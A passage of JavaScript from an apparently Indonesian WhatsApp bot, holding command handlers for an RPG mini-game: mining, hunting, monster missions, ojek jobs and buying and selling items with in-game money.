if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*\n\n`
 teksehmazeh += `*❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n`
 teksehmazeh += `*◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n`
 teksehmazeh += `*🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n`
 teksehmazeh += `*🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n`
 teksehmazeh += `*💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n`
 teksehmazeh += `*⏺️ Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : getLimit(m.sender, limitCount, limit)}\n`
 teksehmazeh += `*💰 Money* : Rp ${getBalance(m.sender, balance) ? getBalance(m.sender, balance) : 0}\n`
 teksehmazeh += `*🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n`
 teksehmazeh += `*HUNT RESULT*\n`
 teksehmazeh += `*🐟 Fish* :` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`
 teksehmazeh += `*🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n`
 teksehmazeh += `*🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n`
 teksehmazeh += `*🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n`
 teksehmazeh += `*🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n`
 teksehmazeh += `*🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n`
 teksehmazeh += `🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n`
 teksehmazeh += `🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n`
 teksehmazeh += `❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n`
 teksehmazeh += `🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n`
 teksehmazeh += `🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
await juna.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {  
title: `MAKIMA - BOT`,
body: 'The best of WhatsApp Bot',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'mining': case 'mine':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await juna.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted: m})
}, 7000)
setTimeout( async () => {
await juna.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 20)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break
case 'beli': case 'buy':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!text) return m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === 'potion'){
let noh = 10000 * anu
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 10000 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangBalance(m.sender, parseInt(noh), balance)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangBalance(m.sender, parseInt(noh), balance)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else { 
 m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)}
 }
 break
case 'sell': case 'sel': case 'jual':{
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nContoh : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return m.reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 150 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 150 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return m.reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 250 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 250 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return m.reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 300 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 300 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return m.reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 500 money`)
 kurangDomba(m.sender, anu)
let monaynya = 500 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return m.reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 500 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 500 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return m.reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 550 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 550 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return m.reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 300 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 300 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return m.reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 500 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 500 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 1000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 1000 * anu
addBalance(m.sender, parseInt(monaynya), balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : Rp${getBalance(m.sender, balance)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nContoh : ${prefix + command} fish 2`)
 }

 }
 break
case 'heal':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!isCekDarah < 1) return m.reply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
if (isCekDarah > 100) return m.reply('Darahmu Penuh')
if (isPotion < 1) return m.reply(`Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 m.reply('Done! Darah mu dah full')
 }
 break
case 'hunt': case 'hunting': {
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply('Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan') 
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
 teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
await juna.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
juna.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 20)
 }
 break
case 'adventure':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
var nedda = [
`Tiba-tiba Ada ${sesuatu}`,
`Awasss`
]
let { key } = await juna.sendMessage(m.chat, {text: `${pushname} On an Adventure`})

for (let i = 0; i < nedda.length; i++) {
await sleep(2000)
await juna.sendMessage(m.chat, {text: nedda[i], edit: key });
}
juna.sendMessage(m.chat, {image:{url:hasm}, caption: `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* Rp ${money}\n ┊ *EXP :* ${adven}Xp`},{quoted:m})
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'ojek': case 'ngojek':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
kurangDarah(m.sender, 20)
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
var nedda = [
`Mencari Pelanggan...`,
`Mendapatkan Orderan...`,
`🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛\n⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n🏘️🏘️🏘️🏘️🌳  🌳 🏘️       \n\n\n➕ Mengantar ke tujuan....`,
`⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛\n⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛\n🏘️🏘️🏘️🏘️🌳  🌳 🏘️       \n\n\n➕ Sampai di tujuan...`,
`➕ 💹Menerima gaji....`,
`*—[ Hasil Ngojek ${pushname} ]—*\n ➕ 💹 Uang = Rp ${money}\n ➕ ✨ Exp = ${adven}	 \n ➕ 😍 Order Selesai = +1`
]
let { key } = await juna.sendMessage(m.chat, {text: 'Loading'})

for (let i = 0; i < nedda.length; i++) {
await sleep(2000)
await juna.sendMessage(m.chat, {text: nedda[i], edit: key });
}
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'luckyday':
case 'luckytime':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(m.sender, b, balance)
addLevelingXp(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
m.reply(`🎰 *Lucky*\n┊ *Money:* Rp ${b}\n┊ *Gold :* ${a}\n┊ *Iron :* ${c}\n┊ *XP :* ${ez}`)
}
break
case 'slime':
case 'killslime':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (m.isGroup) return m.reply('Fitur Overload Coba Lagi Besok!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 400)
addLevelingXp(m.sender, ez)
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufutI = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* Rp ${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break
case 'goblin':
case 'killgoblin':{
if (m.isGroup) return m.reply('Fitur Overload Coba Lagi Besok!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 500)
addLevelingXp(m.sender, ez)
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* Rp ${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break
case 'devil':
case 'killdevil':{
if (m.isGroup) return m.reply('Fitur Overload Coba Lagi Besok!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 600)
addLevelingXp(m.sender, ez)
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* Rp ${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break
case 'behemoth':
case 'killbehemoth':{
if (m.isGroup) return m.reply('Fitur Overload Coba Lagi Besok!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 700)
addLevelingXp(m.sender, ez)
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* Rp ${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break
case 'demon':
case 'killdemon':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 850)
addLevelingXp(m.sender, ez)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* Rp ${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *Diamond:* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break
case 'demonking':
case 'killdemonking':{
if (m.isGroup) return m.reply('Fitur Overload Coba Lagi Besok!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
ez = Math.ceil(Math.random() * 1000)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
kurangDarah(m.sender, 20)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, b)
bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : Rp ${b}\n ┊ *Iron :* ${c}\n ┊ *Gold :* ${a}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*\n\n_Jika Spam Akan Di banned!!!_`
juna.sendMessage(m.chat, {image:{url: bhuud}, caption: hg }, {quoted:m})
}
break
case 'joinrpg':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isPetualang) return m.reply(' *Kamu Telah join sebelumnya*')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
juna.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
case 'sellikan':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 5 * jmlh
if (getFish(m.sender) < jmlh) return m.reply(`*Ikan Anda Tidak Cukup*`)
sellFish(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
m.reply(`🛍️ *MARKET*\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Price/Fish : 5\n ┊ Status : Success\n ┊ Left FishPrice/Fish : ${await getFish(m.sender)}\n ┊ Sales Results : Rp ${rp}`)
}
break
case 'sellbesi':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 10 * jmlh
if (getBesi(m.sender) < jmlh) return m.reply(`Besi Tidak Cukup`)
sellBesi(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
m.reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Besi : 10\n ┊ Status : Sukses\n ┊ Sisa Besi : ${await getBesi(m.sender)}\n ┊ Sales Results : Rp ${rp}`)
}
break
case 'sellemas':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 25 * jmlh
if (getEmas(m.sender) < jmlh) return m.reply(`Emas Anda Tidak Cukup`)
sellEmas(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
